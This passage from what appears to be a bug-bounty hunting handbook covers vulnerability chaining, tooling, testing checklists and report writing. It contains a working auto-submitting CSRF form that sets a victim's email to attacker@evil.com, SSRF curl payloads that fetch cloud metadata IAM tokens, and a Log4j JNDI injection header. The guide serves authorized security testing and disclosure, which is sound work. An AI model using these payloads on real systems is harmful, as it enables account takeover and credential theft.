<!-- POC: Auto-submitting HTML form sending POST to /account/change-email without CSRF token. -->
<html>
<body>
<form action="https://target.com/account/change-email" method="POST" id="csrf">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="password" value="victim_current_password" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>

<!-- Chain: CSRF email change → password reset to new email → full ATO -->
<!-- Learning: -->
<!-- - Missing CSRF tokens on state-changing requests is critical -->
<!-- - Chaining CSRF with email change equals ATO -->
<!-- - Test CSRF on: email change, password change, 2FA disable, recovery questions -->
```

### Real Chains from Reports

```
1. Open redirect + OAuth implicit → token theft
2. Open redirect + form POST → CSRF token leak → ATO
3. Login CSRF + Self-XSS + open redirect → full XSS
4. CRLF + XSS → cookie set + script exec
5. SVG upload + SSO referrer + CSRF login + non-expiring token → SSO token theft
6. Subdomain takeover + CORS wildcard → credential theft
7. XSS in tag manager (Tealium) → stored XSS on every domain
8. Blind SSRF + Redis newline injection → Resque job RCE
9. SSRF → Jolokia → jvmtiAgentLoad → RCE
10. File read → VPN creds → post-auth command injection → RCE
11. Path traversal write → authorized_keys → SSH RCE
12. HTML injection in email → phishing with trusted domain
13. Support email takeover via Zendesk CC → internal access
14. Username prefix impersonation (h1_analyst_) → social engineering
15. Email scanner bot auto-verify → ATO without human
16. Race + email change → verified without ownership
17. Invitation + no email verify → owner takeover
18. Cache poisoning + DOM XSS → site-wide stored XSS
19. Prototype pollution + CDN script → CSP bypass XSS
20. Pixel flood + cache → app-level DoS
21. IDOR in Tealium → admin account → JS injection → all Uber domains
22. XSS → admin session → financial data access
23. Information disclosure → Jira token → full Jira access
24. SSRF → AWS metadata → IAM credentials → infrastructure access
25. Race condition → token distribution → financial loss
26. Markdown parsing bug → arbitrary HTML tags → event handlers → XSS
27. WebSocket form-update → path traversal → POST as victim
28. Drag-and-drop + redirect → XFO bypass → TinyMCE XSS
29. Zendesk ticket hash → Google account registration → support@ takeover
30. security@ forwarding + leave program fast-track → private program harvest
31. SSRF → GCP metadata → kube-env → Kubelet certs → kubectl → root (Shopify $25K)
32. SSRF → Kafka Connect → Jolokia → jvmtiAgentLoad → JVM agent → reverse shell (Aiven)
33. FFmpeg HLS injection → video pipeline → local file read (TikTok)
34. Gravatar redirect → WordPress CDN → arbitrary host → full read SSRF (GitLab)
35. CarrierWave remote_attachment_url + header injection → GCP metadata (GitLab $10K)
36. Self-XSS + Login CSRF → stored XSS → session theft (Tip #21)
37. Open redirect + OAuth → token theft → ATO (Tip #30)
38. XSS + file:// protocol → LFI → sensitive file read (Tip #48)
39. Limited path traversal → authorized_keys overwrite → SSH RCE (Tip #63)
40. Open redirect → SSRF → cloud metadata → infrastructure takeover (Tip #64)
41. CSRF email change → password reset → full ATO (Tip #72)
```

### Chain Construction Method

```
1. Start with information gathering (recon)
2. Find a "pivot point" (entry vulnerability)
3. Use pivot to gain more access/information
4. Chain to higher-impact vulnerability
5. Escalate to maximum impact
```

---

## 17. TOOLING & AUTOMATION

### Essential Tools

```bash
# Reconnaissance
Subfinder, Amass, Sublist3r     # subdomain enumeration
Censys, Shodan                   # internet-wide scanning
LeakIX                           # exposed environment files
Wayback Machine, waybackurls     # historical URLs
GitHub Dorking                   # secrets in repos
crt.sh                           # certificate transparency logs
SecurityTrails                   # DNS history
Hunter.io                        # email discovery
katana                           # active web crawler
gau                              # historical URL fetcher
uro                              # URL deduplication/filtering
httpx                            # HTTP toolkit (probing, tech detection)
Arjun                            # hidden parameter discovery (Python)
x8                               # hidden parameter discovery (Rust)
ParamMiner                       # Burp plugin for parameter mining
GAP                              # Burp extension for parameter collection
LinkFinder                       # JS endpoint extraction
TruffleHog                       # secret scanning
Retire.js                        # outdated library detection
Semgrep                          # static analysis for dangerous patterns

# Scanning
Nmap (+ NSE scripts)             # port scanning, ssl-poodle
Nikto                            # web server scanning
wpscan                           # WordPress-specific
Nuclei                           # template-based scanning
Burp Suite                       # web app proxy
OWASP ZAP                        # alternative to Burp
Drozer                           # Android content providers

# Exploitation
Turbo Intruder                   # race conditions, rate limit bypass
Burp Intruder                    # parameter fuzzing
SQLMap (+ tamper scripts)        # SQL injection automation
Commix                           # command injection
XXEinjector                      # XXE exploitation
SSRFmap                          # SSRF exploitation
phuip-fpizdam                    # PHP-FPM CVE-2019-11043

# SSRF-Specific
rbndr.us                         # DNS rebinding service
interactsh                       # OOB callback server
Burp Collaborator                # OOB interaction
singularity                      # automated DNS rebinding

# Fuzzing
ffuf, wfuzz                      # web fuzzing
AFL, libFuzzer                   # binary fuzzing
Burp Sequencer                   # session analysis
Burp Repeater                    # manual testing

# JavaScript Analysis
js-beautify                      # code beautification
javascript-deobfuscator          # deobfuscation
JSNice                           # ML-based deobfuscation
Eval Villain                     # client-side interceptor
JWT Editor                       # Burp JWT manipulation
CSTC                             # Burp active scanning automation

# Mobile
jadx, apktool                    # APK reverse engineering
Frida                            # dynamic instrumentation
Objection                        # runtime mobile exploration
MobSF                            # mobile security framework

# Memory Safety
AddressSanitizer (ASAN)          # heap/stack overflow detection
Valgrind                         # memory error detection
```

### API-Specific Tools (from API Pentesting Blog)

```bash
# === KITERUNNER (Assetnote) ===
# Best tool for API endpoint discovery
# Unlike Gobuster/Dirbuster: uses ALL HTTP methods (GET, POST, PUT, DELETE)
# Mimics realistic API path structures

# Installation:
sudo apt install golang
git clone https://github.com/assetnote/kiterunner.git
cd kiterunner && make build
sudo mv dist/kr /usr/local/bin/

# Wordlist:
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite

# Usage:
kr scan -w routes-large.kite https://api.target.com
kr scan HTTP://127.0.0.1 -w routes-large.kite
kr scan -w routes-large.kite https://api.target.com -H "Authorization: Bearer TOKEN"
kr scan -w routes-large.kite https://api.target.com -m POST
kr brute <target> -w wordlist.txt    # plain text wordlist

# Multi-target: line-separated file (supports domain, domain:port, full URL)
# Supported formats:
Test.com
Test2.com:443
http://test3.com
http://test4.com
http://test5.com:8888/api

# === MITMPROXY2SWAGGER ===
# Converts captured traffic into OpenAPI 3.0 spec
mitmweb                    # proxy on 8080, view on 8081
# Browse app → save flows → convert:
sudo mitmproxy2swagger -i flows -o spec.yml -p http://target.com -f flow
# View at editor.swagger.io

# === GRAPHW00F ===
# GraphQL engine fingerprinting (sends malformed queries, observes behavior)
git clone https://github.com/dolevf/graphw00f
cd graphw00f
python3 main.py -f -d -t http://target/graphql
# Reference: https://github.com/dolevf/graphw00f

# === GRAPHQL-COP ===
# GraphQL security audit (baseline configuration checks)
python3 graphql-cop/graphql-cop.py -t http://target/graphql

# === GRAPHQL-SECURITY-SCANNER ===
npm install -g graphql-security-scanner
graphql-security-scanner --endpoint http://target/graphql --schema introspection
# More: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html

# === CLAIRVOYANCE ===
# Reconstructs GraphQL schema from field suggestions (when introspection disabled)
pip install clairvoyance
clairvoyance https://target/graphql -o schema.json -w wordlist.txt

# === SJ (BishopFox) ===
# Amazing API recon tool: https://github.com/BishopFox/sj

# === PARAM MINER (Burp Extension) ===
# Guesses up to 65,536 hidden parameter names per request
# Right-click → Extensions → Param Miner → Guess params → Guess JSON parameter
# Check: Extender → Extensions → Param Miner → Output tab
# Link: https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943

# === JWT_TOOL ===
python3 jwt_tool.py <token> -t https://target -M at
# Modes: pb (playbook), at (all tests)
# Options: -rc (cookies), -rh (headers), -pd (POST data)
# More: https://github.com/ticarpi/jwt_tool/wiki

# === WFUZZ (with encoding) ===
wfuzz -e encoders
wfuzz -z file,wordlist.txt,base64
wfuzz -z list,TEST,base64-md5-none
# Docs: https://wfuzz.readthedocs.io/

# === CONTENT TYPE CONVERTER (Burp BApp) ===
# Automatically converts request bodies between XML and JSON

# === BACKSLASH POWERED SCANNER (Burp BApp) ===
# Identifies server-side injection vulnerabilities
# Classifies inputs: boring, interesting, vulnerable

# === JS LINK FINDER (Burp BApp) ===
# Extracts endpoint references from JavaScript files

# === OPENAPI PARSER (Burp BApp) ===
# Crawls and audits OpenAPI documentation (JSON/YAML)

# === TRUFFLEHOG ===
# Automated secrets scanner for GitHub, GitLab, S3, filesystems, Syslog
sudo docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=target-name
# More: https://github.com/trufflesecurity/trufflehog

# === BURP SEQUENCER ===
# Token randomness/predictability analysis
# Proxy auth request → Send to Sequencer → Live Capture → Analyze
```

### Automation Strategies

```bash
# Continuous Monitoring
- Monitor subdomains for changes (new CNAMEs)
- Monitor GitHub repos for leaked secrets
- Monitor certificate transparency logs
- Monitor Wayback Machine for new endpoints
- Monitor DNS changes for takeover opportunities

# Fuzzing Workflows
- Fuzz all parameters with XSS payloads
- Fuzz all parameters with SQL injection payloads
- Fuzz all headers with CRLF injection
- Fuzz file uploads with polyglots
- Fuzz API endpoints with IDOR patterns
- Fuzz GraphQL with introspection queries
- Fuzz interpreters (mruby, PHP) with ASAN builds
- Fuzz URL parameters with SSRF payloads + callback server

# Quick Payload Library
# Subdomain takeover check
dig sub.target.com CNAME +short
curl -I https://sub.target.com

# SSRF metadata
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/'
curl 'http://target/fetch?url=http://[::ffff:a9fe:a9fe]/'
curl 'http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'

# GraphQL introspection
curl -X POST target/graphql -d '{"query":"{__schema{types{name}}}"}'

# XML-RPC probe
curl -X POST /xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Django debug
curl -X POST https://target/admin

# Log4j
curl -H 'X-Api-Version: ${jndi:ldap://COLLAB/a}' target

# Spring actuator
for p in env heapdump trace configprops beans mappings; do
  curl -s target/actuator/$p
done

# MQTT subscribe all
mosquitto_sub -h target -p 1883 -t '#' -v

# SMTP open relay
nc target 587 <<< $'HELO x\nMAIL FROM:<a@target>\nRCPT TO:<victim@x>'

# One-command endpoint discovery (Tip #1)
echo http://target.com | katana -silent | gau | uro | grep "=" | sort -u

# JS file bulk download
# In Burp: Filter HTTP history by *.js → Copy URLs → save to urls.txt
wget -i urls.txt -P js/

# JS secret scanning
trufflehog filesystem ./js/ --no-verification --include-detectors="all"

# JS endpoint extraction
python linkfinder.py -i 'js/*' -o cli | sort -u

# Hidden parameter discovery
arjun -u https://target.com/api/endpoint
x8 -u https://target.com/api/endpoint -w params.txt
```

---

## 18. TESTING METHODOLOGY & CHECKLISTS

### Per-Endpoint Universal Checklist

```
[ ] Unauthenticated access?
[ ] Other user's ID? (horizontal IDOR)
[ ] Other tenant's ID? (cross-tenant)
[ ] Lower-privilege role? (vertical)
[ ] HTTP method swap (GET↔POST↔PUT↔DELETE)?
[ ] Content-Type swap (json↔form↔xml↔text/plain)?
[ ] Array parameter instead of scalar?
[ ] Duplicate parameters?
[ ] Add/remove security-critical fields (admin_approval, role, verified)?
[ ] Wildcard in list endpoints (~/, *)?
[ ] Path traversal in IDs/filenames?
[ ] Null byte / CRLF / Unicode in inputs?
[ ] javascript:/data: in URL fields?
[ ] X-Forwarded-* headers?
[ ] Host header swap?
[ ] Rate limit: IP rotate, array batching, GraphQL aliasing?
[ ] Race condition (single-packet)?
[ ] Response format variants (.json, .js, .csv, .pdf, .zip)?
[ ] Archive/wayback for old UUIDs?
[ ] Mobile API parity with web?
[ ] Embedded/preview/sandbox versions?
[ ] Different account states? (new/old, verified/unverified, free/premium, active/suspended)
[ ] API version enumeration? (v1, v2, v3, beta, internal)
[ ] OPTIONS/HEAD for method discovery?
[ ] Base64-encoded payloads for filter bypass?
```

### Authentication Checklist

```
□ Registration: email validation, rate limiting, duplicate handling
□ Login: brute force protection, session fixation, cookie flags
□ Password reset: token entropy, expiration, binding, rate limiting
□ 2FA: bypass vectors, rate limiting, session invalidation
□ OAuth: PKCE, redirect_uri validation, state parameter
□ Session: expiration, invalidation on password change, concurrent sessions
□ Logout: server-side destruction, cache headers
□ Email verification: server-side enforcement, bot resistance
□ JWT: algorithm validation, signature verification, expiration, audience
□ Magic links: single-use, expiration, parameter pollution resistance
□ Email separators: comma, space, pipe, null byte, array injection
```

### Authorization Checklist

```
□ IDOR: every ID parameter with other users' IDs
□ Horizontal: same-role users accessing each other's data
□ Vertical: low-privilege accessing high-privilege functions
□ Function-level: direct endpoint access without UI
□ Object-level: referenced resources in polymorphic associations
□ Cross-tenant: multi-tenant ID swapping
□ Deprecated APIs: older auth checks
□ Format variants: .json, .js, .csv on private resources
□ Mass assignment: extra fields in POST/PUT/PATCH (role, admin, verified)
□ WebSocket: auth on upgrade AND on message frames
□ Account states: new/old, verified/unverified, free/premium, suspended/active
□ Method override: X-HTTP-Method-Override, _method parameter
```

### Input Validation Checklist

```
□ SQL injection: every parameter, including path segments and JSON keys
□ NoSQL injection: JSON operators ($ne, $gt, $regex, $where)
□ Command injection: filenames, hostnames, user input in system calls
□ XSS: every reflected parameter, stored field, DOM source
□ Path traversal: file operations, download endpoints, upload paths
□ SSRF: URL parameters, webhook configs, image proxies, file processing
□ XML: XXE in all XML parsers, including Office documents
□ Deserialization: all serialized data endpoints
□ Template injection: user input in template engines ({{7*7}})
□ CRLF: all parameters reflected in headers
□ ReDoS: regex-heavy parsing with adversarial input
□ Second-order: stored payloads triggered in different contexts
□ Base64 bypass: encode payloads to evade WAF pattern matching
```

### SSRF-Specific Checklist

```
□ Every URL-accepting endpoint tested with callback server
□ Cloud metadata endpoints tested (AWS, GCP v1beta1, Alibaba, Azure)
□ DNS rebinding attempted (alternating IPs, TTL=0, parallel requests)
□ Redirect chains tested (301, 302, 303, 307, 308)
□ IP encoding bypasses tested (IPv6, hex, octal, decimal, NAT64, Unicode)
□ File processing pipelines tested (FFmpeg, ImageMagick, LibreOffice, SVG)
□ Project import/export tested for URL attributes
□ Sentry/error reporting tested for source code scraping
□ GraphQL URL parameters tested
□ OAuth callback URLs tested
□ Host header injection tested on integration endpoints
□ Escalation to Kubernetes/Jolokia/internal APIs attempted
□ Internal service enumeration (Jenkins, Redis, Elasticsearch, Docker)
```

### Business Logic Checklist

```
□ Pricing: parameter tampering, race conditions, status override
□ Workflow: state transitions, approval bypass, status manipulation
□ Limits: rate limits, quantity limits, concurrent operation limits
□ Sharing: permission escalation, reshare restrictions, inheritance
□ Notifications: email verification, SMS verification, bot verification
□ Invitations: token binding, expiration, email verification
□ Payments: double-spend, refund races, currency manipulation
□ Race conditions: concurrent requests on all state-changing operations
□ Coupon/discount: reuse, stacking, concurrent redemption
```

### Infrastructure Checklist

```
□ Subdomains: takeover, CNAME dangling, DNS records
□ Ports: exposed services, default credentials, version disclosure
□ Alternate ports: 3000, 8080, 8443, 9000, 9200, 5601, 8888
□ Cloud: S3 buckets, cloud metadata, IAM permissions
□ Containers: Docker API, Kubernetes API, etcd
□ Certificates: validity, CAA records, wildcard usage
□ Headers: security headers, information disclosure, CORS
□ CI/CD: log secrets, cache poisoning, dependency integrity
□ Cache: Cache-Control headers, CDN behavior, cache key components
□ 401/403 pages: response body inspection, bypass attempts
```

### API-Specific Testing Checklists (from API Pentesting Blog)

```
# === API RECON CHECKLIST ===
□ Identify all API endpoints (docs, JS files, subdomains, Wayback)
□ Determine API type (public/partner/private)
□ Find documentation (swagger, openapi.json, /docs)
□ Reverse-engineer if undocumented (mitmproxy2swagger, Postman)
□ Identify supported HTTP methods (OPTIONS on every endpoint)
□ Identify supported Content-Types
□ Discover hidden parameters (Param Miner, Arjun, x8)
□ Check for Zombie APIs (retired endpoints still accessible)
□ Enumerate API versions (v1, v2, v3, beta, internal)
□ Check third-party sources (GitHub, Postman Explore, Shodan)
□ Run TruffleHog on target's GitHub org
□ Google dork for exposed API keys and docs

# === API AUTHENTICATION CHECKLIST ===
□ Brute-force login endpoint (JSON payload, base64 values)
□ Password spray with targeted short list (Season+Year+Symbol)
□ OTP brute-force (4-digit: 0000-9999)
□ Token analysis via Burp Sequencer (predictability)
□ JWT attacks via jwt_tool (-M at)
□ Check token expiration and binding
□ Test auth bypass on alternate endpoints

# === API AUTHORIZATION CHECKLIST ===
□ BOLA: test every resource ID with other users' IDs
□ BOLA: test unauthenticated access to resource endpoints
□ BFLA: test POST/PUT/DELETE with lower-privilege tokens
□ BFLA: use A-B-A testing methodology
□ Mass Assignment: add hidden fields from GET responses to PATCH/PUT
□ Mass Assignment: test invalid values to confirm processing
□ Excessive Data Exposure: check if responses leak fields beyond scope
□ Test admin endpoints with regular user tokens
□ Test cross-tenant resource access

# === API INJECTION CHECKLIST ===
□ SQL injection in all parameters (path, query, body, headers)
□ NoSQL injection ($ne, $gt, $nin, $where)
□ OS command injection (separators: |, ||, &, &&, ;, `, $())
□ String terminators (%00, 0x00) to bypass filters
□ Server-side parameter pollution (#, &, = in input)
□ Path traversal in REST path parameters
□ JSON/XML injection in structured data formats
□ Case switching for rate limit bypass
□ Double URL encoding for WAF bypass

# === API SSRF CHECKLIST ===
□ Full URLs in POST body/parameters
□ Partial URLs/paths in parameters
□ Headers containing URLs (Referer)
□ In-band test: point to localhost, check response
□ Blind test: point to webhook.site, check for callback
□ Test dangerous schemas: dict://, file://, gopher://, ftp://
□ Cloud metadata via SSRF (169.254.169.254, metadata.google.internal)

# === API RESOURCE CONSUMPTION CHECKLIST (API4) ===
□ File upload without size validation → disk exhaustion
□ File upload without type restriction → .exe where PDF expected
□ Repeated requests without rate limiting → DoS
□ SMS/email trigger endpoints → financial abuse
□ Large payload bodies → memory exhaustion

# === API INVENTORY MANAGEMENT CHECKLIST (API9) ===
□ Test all API versions (v1 may lack v3's auth checks)
□ Test deprecated/retired endpoints (Zombie APIs)
□ Compare Wayback Machine snapshots for removed endpoints
□ Check if old documentation reveals still-active endpoints
□ Test mobile app API calls (may use older versions)

# === API UNSAFE CONSUMPTION CHECKLIST (API10) ===
□ Test inter-API communication channels
□ Check if third-party API data is validated before processing
□ Test for injection via data received from partner APIs
□ Check encryption of API-to-API communication
□ Test rate limiting on API-to-API calls

# === GRAPHQL-SPECIFIC CHECKLIST ===
□ Find endpoint (probe /graphql, /api/graphql with query{__typename})
□ Test introspection (full query, remove onOperation/onFragment/onField if fails)
□ Bypass introspection defense (newline after __schema, try GET method)
□ Reconstruct schema via Clairvoyance if introspection disabled
□ Fingerprint engine with graphw00f
□ Run baseline audit with GraphQL-Cop
□ Test IDOR via node queries and arguments
□ Test alias-based rate limit bypass
□ Test CSRF (GET requests, x-www-form-urlencoded)
□ Test SQL injection in query arguments
□ Test batching attacks (multiple operations per request)
□ Test mutations for authorization bypass
□ Check for hidden fields via introspection
□ Test subscriptions for auth enforcement
```

---

## 19. REPORT WRITING & IMPACT MAXIMIZATION

### Report Structure

```
1. Executive Summary (1-2 sentences)
2. Vulnerability Details
   - Type and severity
   - Affected endpoint/parameter
   - Root cause
3. Proof of Concept
   - Step-by-step reproduction
   - Screenshots/screen recordings
   - Payloads used
4. Impact Assessment
   - What can an attacker do?
   - Who is affected?
   - Business impact
5. Remediation
   - Specific fix recommendations
   - Code examples if applicable
6. References
   - Related CVEs
   - Similar reports
```

### Impact Maximization

```bash
# Demonstrate Real Impact
- Don't just show XSS popup → show cookie theft / admin session hijack
- Don't just show IDOR → show data exfiltration at scale
- Don't just show SSRF → show cloud metadata access → IAM creds → K8s root
- Chain vulnerabilities to show maximum impact
- Consider business context (financial, reputational, legal)

# SSRF-Specific Impact Escalation
- Blind callback → "server can reach internal network" (medium)
- Internal enumeration → "can map internal services" (high)
- Cloud metadata → "can extract IAM credentials" (critical)
- Kubernetes/Jolokia → "can achieve RCE on infrastructure" (critical+)

# Common Impact Scenarios
- Account takeover → financial loss, data breach
- Stored XSS → mass session hijacking, phishing, malware distribution
- IDOR → GDPR violation, regulatory fines
- RCE → full infrastructure compromise
- Information disclosure → competitive intelligence, targeted attacks
- DoS → revenue loss, SLA violations
```

### API-Specific Impact Scenarios (from API Pentesting Blog)

```bash
# BOLA Impact:
# - Mass data exfiltration (enumerate all resource IDs)
# - GDPR/privacy violation (access other users' PII)
# - Financial data exposure (orders, balances, transactions)

# BFLA Impact:
# - Unauthorized actions on behalf of other users
# - Return anyone's orders (devastating for low-return business)
# - Create/update/delete any user's content (trust damage)
# - Social engineering implications (posting as another user)

# Mass Assignment Impact:
# - Self-assign admin role → full platform compromise
# - 100% discount → financial loss
# - Bypass payment flows → free goods/services

# API SSRF Impact:
# - Access internal services (bypass firewall/VPN)
# - Cloud metadata → IAM credentials → infrastructure takeover
# - Internal API abuse (Jenkins, Redis, Elasticsearch)

# Unrestricted Resource Consumption Impact:
# - Denial of service via disk/memory exhaustion
# - Financial damage (SMS/email API costs)
# - SLA violations

# Zombie API Impact:
# - Outdated endpoints lack modern auth checks
# - Deprecated versions expose removed functionality
# - Expanded attack surface from poor inventory management
```

### Lessons from N/A Closures

```bash
# Always provide PoC — no PoC = closed
# Verify scanner findings manually — BREACH false positive on static site
# Understand scope — out-of-scope third-party may still be accepted with real impact
# Regressions happen — re-test old fixes
# Fixes must cover all paths:
  - class-level config vs method args
  - all backends (not just one TLS library)
  - all platforms (web, mobile, desktop)
  - all input types (string/Buffer/Uint8Array)
# Redaction must be rendering-level, not string markers
# Video PoCs leak PII — check desktop/tabs/files before recording
# Don't assume frontend validation = backend validation
# Test all user roles, not just one
# Test deprecated/forgotten endpoints
# Check for regression after fixes
# Consider feature interactions
# Test error handling paths
```

### PoC Quality

```bash
- Clean, minimal reproduction steps
- No unnecessary tools (if possible)
- Video for complex chains
- Script for reproducible testing
- Sanitize your PoC media (no PII in screenshots/videos)
- Review screen recordings frame-by-frame
- Don't include other undisclosed reports in footage
```

---

## 20. KEY LEARNINGS & FINAL STRATEGY

### The Top 10 Principles

1. **Server-side enforcement is the only enforcement** — Never trust client-side validation
2. **Every ID is an IDOR waiting to happen** — Always verify ownership
3. **Error messages are information disclosure** — Make them consistent
4. **Redirects are dangerous** — Always validate destinations
5. **Features interact** — Test combinations, not just individual features
6. **Old code is vulnerable code** — Check deprecated APIs, legacy endpoints, outdated plugins
7. **Debug code is production code** — Remove test pages, debug endpoints, logging of secrets
8. **Cache is a separate system** — It may interpret requests differently than origin
9. **Unicode is a bypass vector** — Normalize before validation
10. **Race conditions are everywhere** — Test concurrent operations

### The Most Common Root Causes

```
- Missing authorization checks on API endpoints (UI ≠ API)
- Trusting client-supplied identifiers without verification
- Inconsistent validation across different input channels
- Debug/development code left in production
- Missing rate limiting on sensitive operations
- Improper session invalidation on credential changes
- URL validation that doesn't check scheme or normalize
- File upload validation that only checks extension
- Deserialization of untrusted data without class restrictions
- Error responses that leak sensitive information or tokens
```

### The Highest-Impact Vulnerability Types

```
- RCE → Full system compromise
- Authentication Bypass / ATO → Complete account takeover
- Stored XSS → Mass session hijacking
- IDOR (cross-tenant) → Mass data breach
- SSRF to cloud metadata → Infrastructure compromise
- SQL Injection → Full database access
- Deserialization → RCE
- Cache Poisoning → Mass phishing/DDoS
- Subdomain Takeover → Trust abuse
- Race Conditions → Financial loss, privilege escalation
```

### 🎯 The Bug Hunter's Mindset (Compiled from Tips)

```bash
# Real hackers don't memorize payloads.
# They understand WHY payloads work.

# Key mindset principles:

# 1. Understand before you attack (Tip #5)
#    - Map roles, trace requests, question assumptions
#    - 15-20 minutes of understanding > hours of blind scanning

# 2. A 403 is the beginning, not the end (Tip #4)
#    - Try other methods, roles, paths, encodings
#    - The resource EXISTS - find another way in

# 3. Authentication ≠ Authorization (Tip #6)
#    - Being logged in doesn't mean you should have access
#    - Test every privilege boundary

# 4. State transitions hide bugs (Tip #3)
#    - New vs old, verified vs unverified, free vs premium
#    - Developers validate WHO you are, not WHAT STATE you're in

# 5. Chain everything (Tips #21, #30, #48, #63, #64)
#    - Self-XSS + CSRF = Stored XSS
#    - Open Redirect + OAuth = Token Theft
#    - Limited LFI + File Write = RCE
#    - No bug is "low" if it unlocks the next one

# 6. The client is yours (JS Philosophy)
#    - All client-side secrets are extractable
#    - All client-side protections are bypassable
#    - You control the runtime environment

# 7. Recon is coverage + precision (Tip #46)
#    - Don't limit to ports 80/443
#    - Don't limit to obvious endpoints
#    - Hidden parameters, alternate ports, old versions

# 8. Concurrency breaks things (Tip #9)
#    - One request fails, 100 succeed
#    - Race conditions are in every concurrent system
#    - Test with Turbo Intruder single-packet attacks
```

### Think Like an Attacker

```
"What would I do if I wanted to steal data/money/access?"
"What assumptions is the developer making?"
"What happens if I break every assumption?"
"When the server fetches my URL, what can IT reach that I cannot?"
```

### Think Like a Defender

```
"How would I fix this?"
"What other places have the same vulnerability?"
"Did they fix it completely or just patch one symptom?"
"Does the validator and the fetcher agree on every encoding?"
```

### Think Like a Business

```
"What's the real impact?"
"Who is affected and how?"
"What would this cost in the real world?"
```

### Persistence

```
- Vulnerabilities exist in every application
- The difference between finding and not finding is thoroughness
- Test everything, assume nothing, document everything
- Re-test after fixes — patches often introduce new bugs
- When you find one XSS, check all similar input fields across modules
- When you find one IDOR, check all CRUD operations on that resource
- When you find one bypass, check all code paths the fix touched
- When you find one SSRF, escalate through the entire ladder before reporting
```

---
